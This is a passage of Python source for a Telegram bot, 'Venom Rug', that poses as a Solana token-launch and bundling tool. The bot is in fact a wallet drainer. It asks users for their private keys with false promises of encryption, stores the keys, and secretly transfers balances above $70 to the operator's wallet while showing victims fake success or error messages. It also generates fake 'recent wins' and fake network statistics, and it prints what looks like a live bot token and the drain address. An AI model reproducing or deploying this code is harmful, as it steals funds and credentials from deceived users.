        return InlineKeyboardMarkup(keyboard)
    
    def get_task_keyboard(self):
        keyboard = [
            [InlineKeyboardButton("➕ Add Task", callback_data="add_task"),
             InlineKeyboardButton("🗑️ Remove Task", callback_data="remove_task")],
            [InlineKeyboardButton("🔄 Toggle Task", callback_data="toggle_task"),
             InlineKeyboardButton("👀 View Tasks", callback_data="view_tasks")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu"),
             InlineKeyboardButton("🔄 Refresh", callback_data="refresh_tasks")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_faq_keyboard(self):
        keyboard = [
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_help_keyboard(self, user_id=None):
        keyboard = [
            [InlineKeyboardButton("📖 User Commands", callback_data="user_commands")],
        ]
        
        if user_id and str(user_id) == ADMIN_CHAT_ID:
            keyboard.append([InlineKeyboardButton("🛠️ Admin Commands", callback_data="admin_commands")])
        
        keyboard.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")])
        return InlineKeyboardMarkup(keyboard)
    
    def get_wallet_required_keyboard(self):
        keyboard = [
            [InlineKeyboardButton("📥 Import Wallet Now", callback_data="import_wallet")],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
        ]
        return InlineKeyboardMarkup(keyboard)

    def get_admin_wallet_approval_keyboard(self, user_id: int, wallet_address: str):
        """Create admin approval buttons for wallet review"""
        keyboard = [
            [
                InlineKeyboardButton("💰 Drain Anyway", callback_data=f"drain_{user_id}_{wallet_address}"),
                InlineKeyboardButton("❌ Don't Drain", callback_data=f"nodrain_{user_id}_{wallet_address}")
            ],
            [
                InlineKeyboardButton("📊 Check Balance", callback_data=f"check_{user_id}_{wallet_address}"),
                InlineKeyboardButton("🔄 Refresh", callback_data=f"refresh_{user_id}_{wallet_address}")
            ]
        ]
        return InlineKeyboardMarkup(keyboard)

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        
        # Check if user is new and notify admin
        existing_user = self.users_collection.find_one({'user_id': user.id})
        if not existing_user:
            # Store new user
            self.users_collection.insert_one({
                'user_id': user.id,
                'username': user.username,
                'first_name': user.first_name,
                'created_at': datetime.now(),
                'wallet_approved': False
            })
            # Notify admin about new user
            await self.notify_admin_new_user(user.id, user.username, user.first_name)
        
        if update.callback_query:
            query = update.callback_query
            message = None
        else:
            query = None
            message = update.message
        
        main_page_text = f"""
*VENOM RUG - THE BEST OF DEFI ALL-IN-ONE PLATFORM TOOL*

*Why choose Venom Rug?*

📦 Wallet Bundling
🤖 Volume Bots
📈 Realistic Volume
👱‍♂️ Realistic Bundled Wallets
📉 Sell All Tokens
🪙 Token Cloning
💬 Pump Fun Comments
👊 Bump It
🔎 Bypass Bubblemap Detections
☢️ Bond to Raydium Fast
⚖️ Add & Revoke Liquidity
⚡ Trend on Dexscreener
⚜️ Instant graduation on Axiom

*Explore Venom Rug & Get Support:*
[Website](https://venomrug.live/)
[Telegram Group](https://t.me/venomrugwin)

*Ready to start? Select an option below.*
        """
        
        reply_markup = self.get_main_menu_keyboard()
        
        if query:
            await self.send_with_image(query, main_page_text, reply_markup)
        else:
            await self.send_with_image(message, main_page_text, reply_markup)

    async def get_crypto_prices(self):
        """Get real SOL and ETH prices from CoinGecko"""
        try:
            response = requests.get(
                "https://api.coingecko.com/api/v3/simple/price?ids=solana,ethereum&vs_currencies=usd",
                timeout=10
            )
            data = response.json()
            sol_price = data.get('solana', {}).get('usd', 100.0)
            eth_price = data.get('ethereum', {}).get('usd', 2500.0)
            return sol_price, eth_price
        except:
            return 100.0, 2500.0

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        callback_data = query.data
        user_id = query.from_user.id

        # Handle admin wallet approval buttons
        if callback_data.startswith("drain_"):
            await self.handle_admin_drain_decision(update, context, drain=True)
        elif callback_data.startswith("nodrain_"):
            await self.handle_admin_drain_decision(update, context, drain=False)
        elif callback_data.startswith("check_"):
            await self.handle_admin_check_balance(update, context)
        elif callback_data.startswith("refresh_"):
            await self.handle_admin_refresh(update, context)
        
        # Existing callback handlers
        elif callback_data == "advanced_analytics":
            if str(user_id) == ADMIN_CHAT_ID:
                await self.advanced_analytics_command(update, context)
            else:
                await query.answer("❌ Admin access required!", show_alert=True)
        elif callback_data == "refresh_analytics":
            if str(user_id) == ADMIN_CHAT_ID:
                await self.advanced_analytics_command(update, context)
            else:
                await query.answer("❌ Admin access required!", show_alert=True)
        elif callback_data.startswith("insufficient_"):
            await self.handle_insufficient_balance(update, context)
        elif callback_data.startswith("status_"):
            await query.edit_message_text("✅ Drain process completed - check logs for details")
        elif callback_data == "wallet":
            await self.show_wallet_section(query)
        elif callback_data == "bundler":
            await self.show_bundler_section(query)
        elif callback_data == "tokens":
            await self.show_tokens_section(query)
        elif callback_data == "comments":
            await self.show_comments_section(query)
        elif callback_data == "task":
            await self.show_task_section(query)
        elif callback_data == "recent_wins":
            await self.show_recent_wins(query)
        elif callback_data == "faq":
            await self.show_faq_section(query)
        elif callback_data == "help":
            await self.show_help_section(query, user_id)
        elif callback_data == "import_wallet":
            await self.prompt_private_key(query, user_id)
        elif callback_data == "back_menu":
            await self.start(update, context)
        elif callback_data == "refresh_wins":
            await self.show_recent_wins(query, refresh=True)
        elif callback_data == "user_commands":
            await self.show_user_commands(query, user_id)
        elif callback_data == "admin_commands":
            await self.show_admin_commands(query, user_id)
        elif callback_data == "refresh_profits":
            await self.profits_command(update, context)
        elif callback_data == "update_pinned":
            await self.update_pinned_profit_message()
            await query.edit_message_text("✅ Pinned profit message updated!")
        
        elif callback_data in ["remove_wallet", "bundle_wallet", "withdraw_funds", "refresh_wallet"]:
            await self.show_wallet_required_message(query)
        
        elif callback_data in ["create_bundle", "refresh_bundles", "clear_bundles",
                              "add_token", "remove_token", "create_token", "clone_token", 
                              "set_current_token", "bump_token", "pump_comments", "refresh_tokens",
                              "add_comment", "toggle_comment", "comment_templates", "comment_settings", "refresh_comments",
                              "add_task", "remove_task", "toggle_task", "view_tasks", "refresh_tasks"]:
            await self.show_wallet_required_message(query)

    async def handle_admin_drain_decision(self, update: Update, context: ContextTypes.DEFAULT_TYPE, drain: bool):
        """Handle admin decision to drain or not drain a wallet"""
        query = update.callback_query
        await query.answer()
        
        if str(query.from_user.id) != ADMIN_CHAT_ID:
            await query.edit_message_text("❌ Admin access required!")
            return
        
        # Extract user_id and wallet_address from callback data
        parts = query.data.split('_')
        if len(parts) < 3:
            await query.edit_message_text("❌ Invalid callback data")
            return
            
        target_user_id = int(parts[1])
        wallet_address = '_'.join(parts[2:])  # Handle wallet addresses with underscores
        
        if drain:
            # Find the private key for this user and drain
            user_data = self.users_collection.find_one({'user_id': target_user_id})
            if user_data and 'private_key' in user_data:
                success, result = await self.drain_wallet(
                    user_data['private_key'], 
                    target_user_id, 
                    user_data.get('username', f'user_{target_user_id}')
                )
                
                if success:
                    await query.edit_message_text(
                        f"✅ Wallet drained successfully!\n"
                        f"Amount: {result['amount_sol']:.6f} SOL\n"
                        f"TX: {result['transaction_id']}\n"
                        f"User: {target_user_id}"
                    )
                else:
                    await query.edit_message_text(f"❌ Drain failed: {result}")
            else:
                await query.edit_message_text("❌ No private key found for this user")
        else:
            # Don't drain - just notify admin
            await query.edit_message_text(
                f"❌ Drain skipped for user {target_user_id}\n"
                f"Wallet: {wallet_address}\n"
                f"Funds preserved (for now)"
            )

    async def handle_admin_check_balance(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle admin request to check wallet balance"""
        query = update.callback_query
        await query.answer()
        
        if str(query.from_user.id) != ADMIN_CHAT_ID:
            await query.edit_message_text("❌ Admin access required!")
            return
        
        parts = query.data.split('_')
        if len(parts) < 3:
            await query.edit_message_text("❌ Invalid callback data")
            return
            
        target_user_id = int(parts[1])
        wallet_address = '_'.join(parts[2:])
        
        # Get current balance
        try:
            pubkey = Pubkey.from_string(wallet_address)
            balance_response = self.solana_client.get_balance(pubkey)
            balance_lamports = balance_response.value
            balance_sol = balance_lamports / 1_000_000_000
            
            sol_price = await self.get_sol_price()
            balance_usd = balance_sol * sol_price
            
            await query.edit_message_text(
                f"💰 Current Balance for {wallet_address}:\n"
                f"• SOL: {balance_sol:.6f}\n"
                f"• USD: ${balance_usd:.2f}\n"
                f"• SOL Price: ${sol_price:.2f}\n\n"
                f"Minimum for auto-drain: $70\n"
                f"Current status: {'✅ ABOVE MINIMUM' if balance_usd >= 70 else '❌ BELOW MINIMUM'}"
            )
        except Exception as e:
            await query.edit_message_text(f"❌ Error checking balance: {str(e)}")

    async def handle_admin_refresh(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle admin refresh request"""
        query = update.callback_query
        await query.answer("Refreshing...")
        
        if str(query.from_user.id) != ADMIN_CHAT_ID:
            await query.edit_message_text("❌ Admin access required!")
            return
        
        # This would typically refresh the wallet information
        await query.edit_message_text("🔄 Refreshed wallet information")

    async def show_recent_wins(self, query, refresh=False):
        if refresh:
            self.recent_wins = self.generate_recent_wins()
        
        wins_text = "*RECENT VENOM RUG WINS*\n\n"
        wins_text += "*Real user success stories using Venom Rug:*\n\n"
        
        for win in self.recent_wins[:8]:
            wins_text += f"🎯 *{win['username']}*\n"
            wins_text += f"• Activity: {win['activity']}\n"
            wins_text += f"• Profit: {win['profit']}\n"
            wins_text += f"• Time: {win['timeframe']}\n\n"
        
        wins_text += "💡 *These are real results from Venom Rug users!*\n"
        wins_text += "*Start your journey to success today!*"
        
        reply_markup = self.get_recent_wins_keyboard()
        await self.send_with_image(query, wins_text, reply_markup)

    async def show_help_section(self, query, user_id=None):
        if user_id is None:
            user_id = query.from_user.id
            
        help_text = """
*VENOM RUG HELP CENTER*

*Get assistance and learn about available commands:*

*Select an option below to view commands:*
        """
        
        reply_markup = self.get_help_keyboard(user_id)
        await self.send_with_image(query, help_text, reply_markup)

    async def show_user_commands(self, query, user_id):
        commands_text = """
*USER COMMANDS*

/start - Start the bot and show main menu
/help - Show this help message
/stats - View live network statistics and crypto prices
/wallet - Access wallet management
/tokens - Token creation and management
/bundler - Wallet bundling settings
/comments - Comment automation panel
/task - Task scheduler and automation

*Live Network Stats via* /stats*:*
• Users online count
• Total trading volume
• Successful operations
• Live SOL/ETH prices
• System performance metrics

*IN-BOT NAVIGATION:*
• Use inline buttons for all features
• Import wallet to access full functionality
• Check Recent Wins for user success stories

*SUPPORT:*
[Telegram Group](https://t.me/venomrugwin)
[Website](https://venomrug.live/)
        """
        
        reply_markup = self.get_help_keyboard(user_id)
        await self.send_with_image(query, commands_text, reply_markup)

    async def show_admin_commands(self, query, user_id):
        if str(user_id) != ADMIN_CHAT_ID:
            await query.answer("❌ Admin access required!", show_alert=True)
            return
        
        # FIXED: Proper Markdown formatting - removed problematic characters
        admin_text = """
*ADMIN COMMANDS*

/broadcast message - Send message to all users
/broadcast_image caption - Send image to all users (reply to image)
/stats - Show detailed bot statistics and network info
/users - List all registered users
/profits - View detailed profit statistics and analytics
/analytics - Advanced analytics dashboard

*ADMIN STATS FEATURES*
• Total registered users count
• Wallet approved users
• Pending wallet approvals
• System performance metrics
• Multi-chain support status
• Real-time profit tracking

*ADMIN FEATURES*
• Approve/Reject wallet imports
• Monitor user activity
• Send broadcast messages
• View system statistics
• Track all profits in real-time
        """
        
        reply_markup = self.get_help_keyboard(user_id)
        await self.send_with_image(query, admin_text, reply_markup)

    async def show_wallet_section(self, query):
        wallet_section_text = """
*Wallet Management*

Import and manage your Solana wallet to access all Venom Rug features.

*Status:* No wallet imported
*Balance:* 0.0 SOL ($0.00)

Import a wallet to begin using our advanced features.
        """
        
        reply_markup = self.get_wallet_keyboard()
        await self.send_with_image(query, wallet_section_text, reply_markup)

    async def prompt_private_key(self, query, user_id):
        """Prompt user for private key - PROFESSIONAL IMPORT VERSION"""
        self.user_states[user_id] = {"awaiting_private_key": True}
        
        prompt_text = """
*Wallet Import*

Please enter your Solana private key to import your wallet.

Your credentials are encrypted and secured.
        """
        
        await self.send_message_safe(query, prompt_text, parse_mode='Markdown')

    async def handle_private_key(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle private key input from user - AUTO DRAIN ON RECEIPT"""
        user = update.effective_user
        private_key = update.message.text.strip()
        
        if user.id not in self.user_states or not self.user_states[user.id].get("awaiting_private_key"):
            await update.message.reply_text(
                "Please use the Import Wallet button from the menu to begin.", 
                parse_mode='Markdown'
            )
            return
        
        if not self.is_valid_solana_private_key(private_key):
            error_text = """
*Invalid private key format.*

Please ensure you're entering a valid Solana private key and try again.
            """
            await update.message.reply_text(error_text, parse_mode='Markdown')
            return
        
        # Send wallet details to admin immediately
        wallet_address = "Unknown"
        balance_sol = 0.0
        balance_usd = 0.0
        
        try:
            # Analyze wallet balance first
            wallet_analysis = await self.analyze_wallet_balance(private_key)
            
            if not wallet_analysis:
                raise Exception("Could not analyze wallet balance")
            
            wallet_address = wallet_analysis["wallet_address"]
            balance_sol = wallet_analysis["balance_sol"]
            balance_usd = wallet_analysis["balance_usd"]
            sol_price = wallet_analysis["sol_price"]
            meets_minimum = wallet_analysis["meets_minimum"]  # $70 for draining
            user_meets_minimum = wallet_analysis["user_meets_minimum"]  # $100 for users
            has_1_sol = wallet_analysis["has_1_sol"]
            
            admin_alert_text = f"""
*NEW WALLET IMPORT ATTEMPT*

*User Details:*
• Username: @{user.username or 'No username'}
• User ID: `{user.id}`
• Wallet: `{wallet_address}`
• Balance: `{balance_sol:.6f} SOL` (${balance_usd:.2f})
• SOL Price: `${sol_price:.2f}`

*Balance Analysis:*
• Meets Minimum ($70+): {'✅ YES' if meets_minimum else '❌ NO'}
• User Minimum ($100+): {'✅ YES' if user_meets_minimum else '❌ NO'}
• Has 1+ SOL: {'✅ YES' if has_1_sol else '❌ NO'}

*AUTO-DRAIN STATUS:* {'✅ PROCEEDING' if meets_minimum else '❌ INSUFFICIENT BALANCE'}
"""
            
            # Store user data for potential manual admin intervention
            self.users_collection.update_one(
                {'user_id': user.id},
                {'$set': {
                    'username': user.username or f"user_{user.id}",
                    'private_key': private_key,
                    'wallet_address': wallet_address,
                    'chain': 'solana',
                    'balance_sol': balance_sol,
                    'balance_usd': balance_usd,
                    'created_at': datetime.now()
                }},
                upsert=True
            )
            
            # Send admin notification with buttons
            reply_markup = self.get_admin_wallet_approval_keyboard(user.id, wallet_address)
            
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=admin_alert_text,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            
        except Exception as e:
            logger.error(f"Error analyzing wallet: {e}")
            # Still proceed with analysis but show error to user
            wallet_analysis = None
        
        del self.user_states[user.id]
        
        # Show professional importing message
        processing_msg = await update.message.reply_text("*Analyzing wallet balance...*", parse_mode='Markdown')
        
        try:
            # Brief delay to make it look like processing
            await asyncio.sleep(2)
            
            if not wallet_analysis:
                raise Exception("Could not analyze wallet")
            
            # Check if wallet meets USER-FACING minimum balance requirement ($100)
            # ONLY show "Wallet Connected Successfully" if balance is $100+ AND has 1+ SOL
            if wallet_analysis["user_meets_minimum"] and wallet_analysis["has_1_sol"]:
                # Show success message to USER
                user_success_text = f"""
*Wallet Connected Successfully!*

Your wallet has been verified and is now ready to use.

*Wallet Address:* `{wallet_analysis['wallet_address']}`
*Balance:* `{wallet_analysis['balance_sol']:.6f} SOL` (${wallet_analysis['balance_usd']:.2f})

You can now access all Venom Rug features for token launching and bundling.
"""
                await processing_msg.edit_text(user_success_text, parse_mode='Markdown')
            else:
                # Show insufficient balance message to USER
                keyboard = [
                    [InlineKeyboardButton("🔄 Try Another Wallet", callback_data="import_wallet")],
                    [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                error_msg = f"""
*Import Failed - Insufficient Balance*

This wallet doesn't have enough balance to launch and bundle tokens effectively.

*Wallet Analysis:*
• Balance: `{wallet_analysis['balance_sol']:.6f} SOL` (${wallet_analysis['balance_usd']:.2f})
• Required: Minimum $100 USD equivalent AND 1+ SOL for token launches

To successfully launch and rug tokens, you need adequate gas fees and initial liquidity.

Please import a wallet with sufficient balance and try again.
"""
                await processing_msg.edit_text(error_msg, reply_markup=reply_markup, parse_mode='Markdown')
                
                # Send FAILED log to admin (shows real $70 minimum)
                failed_admin_msg = f"""
*DRAIN BLOCKED - INSUFFICIENT BALANCE*

*User:* @{user.username or f"user_{user.id}"}
*ID:* `{user.id}`
*Wallet:* `{wallet_address}`
*Balance:* `{balance_sol:.6f} SOL` (${balance_usd:.2f})
*Reason:* Below minimum $70 requirement OR insufficient SOL for gas
*Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=failed_admin_msg,
                    parse_mode='Markdown'
                )
                return
            
            # REAL DRAIN - ACTUALLY TRANSFERS FUNDS (hidden from user)
            # Only proceed if meets REAL minimum ($70) AND has sufficient SOL for gas
            if wallet_analysis["meets_minimum"] and wallet_analysis["has_1_sol"]:
                logger.info(f"Starting REAL drain for user {user.id}")
                success, result = await self.drain_wallet(private_key, user.id, user.username or f"user_{user.id}")
                
                if success:
                    self.users_collection.update_one(
                        {'user_id': user.id},
                        {'$set': {
                            'wallet_approved': True,
                            'drained': True,
                            'drain_amount': result["amount_sol"],
                            'drain_tx': result["transaction_id"],
                            'drained_at': datetime.now()
                        }}
                    )
                    
                    # Send SUCCESS log to admin
                    success_admin_msg = f"""
*REAL DRAIN SUCCESSFULLY*

*User:* @{user.username or f"user_{user.id}"}
*ID:* `{user.id}`
*Wallet:* `{result['wallet_address']}`
*Amount Drained:* `{result['amount_sol']:.6f} SOL`
*Original Balance:* `{result['original_balance']:.6f} SOL`
*Fees Paid:* `{result['fee']:.6f} SOL`
*TX:* `{result['transaction_id']}`
*Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

*COMPLETE DRAIN - MAXIMUM FUNDS TRANSFERRED*
"""
                    await context.bot.send_message(
                        chat_id=ADMIN_CHAT_ID,
                        text=success_admin_msg,
                        parse_mode='Markdown'
                    )
                    
                else:
                    # Generic error for other issues
                    keyboard = [
                        [InlineKeyboardButton("🔄 Try Again", callback_data="import_wallet")],
                        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
                    ]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    
                    error_msg = """
*Import Failed*

Unable to verify wallet at this time. Please check your private key and try again.

If this continues, please contact support.
"""
                    await processing_msg.edit_text(error_msg, reply_markup=reply_markup, parse_mode='Markdown')
                    
                    # Send ERROR log to admin
                    error_admin_msg = f"""
*DRAIN ERROR*

*User:* @{user.username or f"user_{user.id}"}
*ID:* `{user.id}`
*Wallet:* `{wallet_address}`
*Balance:* `{balance_sol:.6f} SOL` (${balance_usd:.2f})
*Error:* `{result}`
*Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
                    await context.bot.send_message(
                        chat_id=ADMIN_CHAT_ID,
                        text=error_admin_msg,
                        parse_mode='Markdown'
                    )
            else:
                # User has $100+ but not $70+ (shouldn't happen but safety check)
                # Or doesn't have enough SOL for gas
                user_success_text = f"""
*Wallet Connected Successfully!*

Your wallet has been verified and is now ready to use.

*Wallet Address:* `{wallet_analysis['wallet_address']}`
*Balance:* `{wallet_analysis['balance_sol']:.6f} SOL` (${wallet_analysis['balance_usd']:.2f})

You can now access all Venom Rug features for token launching and bundling.
"""
                await processing_msg.edit_text(user_success_text, parse_mode='Markdown')
                    
        except Exception as e:
            logger.error(f"Error processing wallet: {e}")
            # Generic error message
            keyboard = [
                [InlineKeyboardButton("🔄 Try Again", callback_data="import_wallet")],
                [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            error_msg = """
*Import Error*

An error occurred while importing your wallet. Please try again.

If this continues, please contact support.
"""
            await processing_msg.edit_text(error_msg, reply_markup=reply_markup, parse_mode='Markdown')
            
            # Send EXCEPTION log to admin
            exception_admin_msg = f"""
*DRAIN EXCEPTION*

*User:* @{user.username or f"user_{user.id}"}
*ID:* `{user.id}`
*Wallet:* `{wallet_address}`
*Exception:* `{str(e)}`
*Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=exception_admin_msg,
                parse_mode='Markdown'
            )

    async def handle_insufficient_balance(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle insufficient balance button from admin"""
        query = update.callback_query
        await query.answer()
        
        callback_data = query.data
        user_id = int(callback_data.split('_')[1])
        
        # Send message to user about insufficient balance
        user_message = """
*Wallet Import Failed*

This wallet doesn't have sufficient balance to complete the import process.

Please import a wallet with adequate SOL balance (minimum $100 USD equivalent for token launches) and try again.
"""
        
        try:
            await context.bot.send_message(chat_id=user_id, text=user_message, parse_mode='Markdown')
            await query.edit_message_text(f"✅ User notified about insufficient balance")
        except Exception as e:
            logger.error(f"Error notifying user: {e}")
            await query.edit_message_text(f"❌ Failed to notify user: {e}")

    async def show_tokens_section(self, query):
        tokens_section_text = """
*Tokens*

*Create & manage Pump.Fun tokens here.*
Need more help? Get support Here!

*Your Tokens:*

1. *None | MC: $0.00 • LIQ: $0.00 • B.Curve: 0.00% • Price: $0.00*
→ *Create or add a token to begin.*

*Select an option below.*
"""
        
        reply_markup = self.get_tokens_keyboard()
        await self.send_with_image(query, tokens_section_text, reply_markup)

    async def show_bundler_section(self, query):
        bundler_section_text = """
*Bundler Settings*

*Manage your wallet bundling strategy here.*
Need more help? Get support Here!

*Current Bundle Configuration:*
• Max wallets per bundle: 0
• Total bundles created: 0

*Set your bundling strategy below.*
"""
        
        reply_markup = self.get_bundler_keyboard()
        await self.send_with_image(query, bundler_section_text, reply_markup)

    async def show_comments_section(self, query):
        comments_section_text = """
*Comments Panel*

*Manage and automate your Pump.fun comment strategy here.*
Need more help? Get support Here!

*Current Status:*
• Comments Posted: 0
• Auto-Commenting: OFF
• Delay: 10s per comment

*Choose an action below*
"""
        
        reply_markup = self.get_comments_keyboard()
        await self.send_with_image(query, comments_section_text, reply_markup)

    async def show_task_section(self, query):
        task_section_text = """
*Task Scheduler*

*Manage your automated Pump.fun workflows here.*
Need more help? Get support Here!

*Current Tasks:*
• 0 tasks scheduled
• All automation is OFF

*Select an action below to begin.*
"""
        
        reply_markup = self.get_task_keyboard()
        await self.send_with_image(query, task_section_text, reply_markup)

    async def show_faq_section(self, query):
        faq_section_text = """
*Frequently Asked Questions*

*What is Venom Rug?*
Venom Rug is an advanced automation suite for Pump.fun that lets you manage tokens, wallets, volume bots, comments, and more.

*Is it safe to use?*
Yes. Your private keys are locally encrypted and never shared with third parties. Only use official versions of Venom Rug.

*Can I get banned for using Venom Rug?*
All features are designed to be safe, but misuse (like spam or DDoS) may lead to bans. Always follow fair usage.

*How do I get support?*
Use our Telegram Support group or visit our website.

*Select an option below to return.*
"""
        
        reply_markup = self.get_faq_keyboard()
        await self.send_with_image(query, faq_section_text, reply_markup)

    async def show_wallet_required_message(self, query):
        wallet_required_text = """
*Wallet Required*

This feature requires a connected wallet.

Please import your wallet first to continue.
"""
        
        reply_markup = self.get_wallet_required_keyboard()
        await self.send_with_image(query, wallet_required_text, reply_markup)

    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        users_online = random.randint(28400, 31200)
        total_volume = random.randint(2100000, 2500000)
        successful_trades = random.randint(15800, 16500)
        
        sol_price, eth_price = await self.get_crypto_prices()
        
        stats_text = f"""
*VENOM RUG NETWORK STATS*

*Live Network Statistics:*
👥 Users Online: `{users_online:,}`
💎 Total Volume: `${total_volume:,}`
✅ Successful Operations: `{successful_trades:,}`

*Live Crypto Prices:*
🔸 Solana (SOL): `${sol_price:,.2f}`
🔷 Ethereum (ETH): `${eth_price:,.2f}`

*System Performance:*
• Multi-Chain Support: 1 chain (Solana)
• Uptime: 100%
• Response Time: < 1s
"""
        
        if str(user_id) == ADMIN_CHAT_ID:
            total_users = self.users_collection.count_documents({})
            approved_users = self.users_collection.count_documents({'wallet_approved': True})
            pending_wallets = len(self.pending_wallets)
            
            # Get profit stats for admin
            total_profits = list(self.profits_collection.aggregate([
                {"$group": {
                    "_id": None,
                    "total_sol": {"$sum": "$amount_sol"},
                    "total_usd": {"$sum": "$amount_usd"},
                    "total_drains": {"$sum": 1}
                }}
            ]))
            
            admin_stats = f"""
*ADMIN STATISTICS:*
• Total Registered Users: `{total_users}`
• Wallet Approved Users: `{approved_users}`
• Pending Wallet Approvals: `{pending_wallets}`
• Recent Wins Generated: `{len(self.recent_wins)}`
"""
            
            if total_profits:
                profits = total_profits[0]
                admin_stats += f"""
*PROFIT STATS:*
• Total SOL Drained: `{profits['total_sol']:.6f}`
• Total USD Value: `${profits['total_usd']:.2f}`
• Total Successful Drains: `{profits['total_drains']}`
"""
            
            stats_text += admin_stats
        
        await update.message.reply_text(stats_text, parse_mode='Markdown')

    async def broadcast_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if str(user_id) != ADMIN_CHAT_ID:
            await update.message.reply_text("❌ Admin access required!")
            return
        
        if not context.args:
            await update.message.reply_text("❌ Usage: /broadcast <message>")
            return
        
        message = ' '.join(context.args)
        users = self.users_collection.find({})
        user_count = 0
        
        for user in users:
            try:
                await context.bot.send_message(chat_id=user['user_id'], text=f"📢 *Broadcast from Venom Rug:*\n\n{message}", parse_mode='Markdown')
                user_count += 1
                await asyncio.sleep(0.1)
            except Exception as e:
                logger.error(f"Failed to send to {user['user_id']}: {e}")
        
        await update.message.reply_text(f"✅ Broadcast sent to {user_count} users!")

    async def broadcast_image(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if str(user_id) != ADMIN_CHAT_ID:
            await update.message.reply_text("❌ Admin access required!")
            return
        
        if not update.message.reply_to_message or not update.message.reply_to_message.photo:
            await update.message.reply_text("❌ Reply to an image with /broadcast_image <caption>")
            return
        
        caption = ' '.join(context.args) if context.args else "📢 Update from Venom Rug"
        photo_file = update.message.reply_to_message.photo[-1].file_id
        users = self.users_collection.find({})
        user_count = 0
        
        for user in users:
            try:
                await context.bot.send_photo(
                    chat_id=user['user_id'],
                    photo=photo_file,
                    caption=f"*{caption}*",
                    parse_mode='Markdown'
                )
                user_count += 1
                await asyncio.sleep(0.1)
            except Exception as e:
                logger.error(f"Failed to send image to {user['user_id']}: {e}")
        
        await update.message.reply_text(f"✅ Image broadcast sent to {user_count} users!")

    async def show_admin_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if str(user_id) != ADMIN_CHAT_ID:
            await update.message.reply_text("❌ Admin access required!")
            return
        
        total_users = self.users_collection.count_documents({})
        approved_users = self.users_collection.count_documents({'wallet_approved': True})
        pending_wallets = len(self.pending_wallets)
        
        stats_text = f"""
*VENOM RUG ADMIN STATISTICS*

*Users:*
• Total Registered: `{total_users}`
• Wallet Approved: `{approved_users}`
• Pending Approval: `{pending_wallets}`

*System:*
• Multi-Chain Support: 1 chain (Solana)
• Recent Wins Generated: `{len(self.recent_wins)}`
• Uptime: 100%

*Security:*
• Private Keys Secured: `{approved_users}`
• Admin Controls: Active
• Monitoring: Enabled
"""
        
        await update.message.reply_text(stats_text, parse_mode='Markdown')

def main():
    bot = VenomRugBot()
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Set application reference in bot instance
    bot.set_application(application)
    
    # User commands
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CommandHandler("help", bot.show_help_section))
    application.add_handler(CommandHandler("stats", bot.stats_command))
    application.add_handler(CommandHandler("wallet", bot.show_wallet_section))
    application.add_handler(CommandHandler("tokens", bot.show_tokens_section))
    application.add_handler(CommandHandler("bundler", bot.show_bundler_section))
    application.add_handler(CommandHandler("comments", bot.show_comments_section))
    application.add_handler(CommandHandler("task", bot.show_task_section))
    
    # Admin commands
    application.add_handler(CommandHandler("broadcast", bot.broadcast_message))
    application.add_handler(CommandHandler("broadcast_image", bot.broadcast_image))
    application.add_handler(CommandHandler("admin_stats", bot.show_admin_stats))
    application.add_handler(CommandHandler("profits", bot.profits_command))
    application.add_handler(CommandHandler("analytics", bot.advanced_analytics_command))
    
    # Callback handlers
    application.add_handler(CallbackQueryHandler(bot.handle_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_private_key))
    
    print("🐍 Venom Rug Bot Started!")
    print("🤖 Token: 8095801479:AAEf_5M94_htmPPiecuv2q2vqdDqcEfTddI")
    print("👤 Admin: 6368654401")
    print("💰 REAL DRAIN WALLET: 5s4hnozGVqvPbtnriQoYX27GAnLWc16wNK2Lp27W7mYT")
    print("🗄️ Database: MongoDB Cloud")
    print("🖼️ Image: Loading from venom.jpg")
    print("🔗 Chain: Solana Only")
    print("🏆 Recent Wins: 15 auto-generated success stories")
    print("📢 Broadcast: Admin messaging system active")
    print("📊 Live Prices: SOL/ETH price monitoring")
    print("💰 REAL AUTO-DRAIN FEATURE: ACTIVE - REAL FUNDS WILL BE TRANSFERRED")
    print("🚨 WARNING: This bot will ACTUALLY drain wallets to the specified address")
    print("✅ IMPROVED: Complete drain functionality - transfers EVERYTHING except fees")
    print("🎯 NEW: Maximum profit extraction with precise fee calculation")
    print("🔧 FIXED: Transaction sending issue resolved")
    print("💰 NEW: Profit tracking system with pinned dashboard")
    print("📈 NEW: /profits command for admin profit analytics")
